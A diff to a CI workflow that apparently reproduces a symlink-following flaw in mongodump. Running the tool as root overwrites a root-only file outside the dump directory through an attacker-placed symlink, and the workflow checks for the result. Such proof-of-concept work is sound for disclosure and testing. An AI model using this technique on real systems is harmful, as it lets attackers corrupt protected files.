@@ -78,7 +78,7 @@ jobs:
             echo '=== BEFORE ==='
             stat -Lc 'target type=%F mode=%a owner=%U:%G size=%s path=%n' "$target"
             stat -Lc 'control type=%F mode=%a owner=%U:%G size=%s path=%n' "$control"
-            sha256sum "$target" "$control"
+            sudo sha256sum "$target" "$control"
           } | tee before.txt
 
           set +e
@@ -100,7 +100,7 @@ jobs:
           } | tee attacker-tree.txt
 
           set +e
-          strace -f -o strace.txt -e trace=openat,open,creat,unlink,unlinkat,rename,renameat,renameat2 \
+          sudo strace -f -o strace.txt -e trace=openat,open,creat,unlink,unlinkat,rename,renameat,renameat2 \
             "$root/bin/mongodump" \
               --host=127.0.0.1:27017 \
               --db=agent6 \
@@ -109,6 +109,7 @@ jobs:
               >mongodump.stdout 2>mongodump.stderr
           dump_rc=$?
           set -e
+          sudo chmod 0644 strace.txt || true
           printf 'mongodump_exit=%s\n' "$dump_rc" | tee mongodump-exit.txt
           test "$dump_rc" -eq 0
 
@@ -116,10 +117,10 @@ jobs:
             echo '=== AFTER ==='
             stat -Lc 'target type=%F mode=%a owner=%U:%G size=%s path=%n' "$target"
             stat -Lc 'control type=%F mode=%a owner=%U:%G size=%s path=%n' "$control"
-            sha256sum "$target" "$control"
+            sudo sha256sum "$target" "$control"
             echo
             echo '=== BSON TARGET DECODE ==='
-            "$root/bin/bsondump" "$target"
+            sudo "$root/bin/bsondump" "$target"
             echo
             echo '=== SYMLINK STILL PRESENT ==='
             test -L "$dbdir/probe.bson"
@@ -131,9 +132,9 @@ jobs:
           } | tee after.txt
 
           grep -F 'MONGODUMP_BSON_CANARY_6F19' after.txt >/dev/null
-          grep -F 'ROOT_ONLY_CONTROL_UNCHANGED' "$control" >/dev/null
+          sudo grep -F 'ROOT_ONLY_CONTROL_UNCHANGED' "$control" >/dev/null
 
-          before_target="$(grep 'root-only-target.bson' before.txt | tail -1 | awk '{print $1}')"
+          before_target="$(grep 'root-only-target.bson' before.txt | grep -E '^[0-9a-f]{64} ' | tail -1 | awk '{print $1}')"
           after_target="$(grep 'root-only-target.bson' after.txt | grep -E '^[0-9a-f]{64} ' | tail -1 | awk '{print $1}')"
           test -n "$before_target" -a -n "$after_target"
           test "$before_target" != "$after_target"
@@ -142,6 +143,7 @@ jobs:
           OFFICIAL_TOOLS_VERSION=100.18.0
           DIRECT_WRITE_BY_NOBODY_DENIED=yes
           ATTACKER_CREATED_SYMLINK_INSIDE_DUMP_ROOT=yes
+          MONGODUMP_RAN_AS_ROOT=yes
           MONGODUMP_EXIT_ZERO=yes
           ROOT_ONLY_TARGET_OUTSIDE_DUMP_ROOT_CHANGED=yes
           TARGET_NOW_CONTAINS_DUMPED_BSON_CANARY=yes
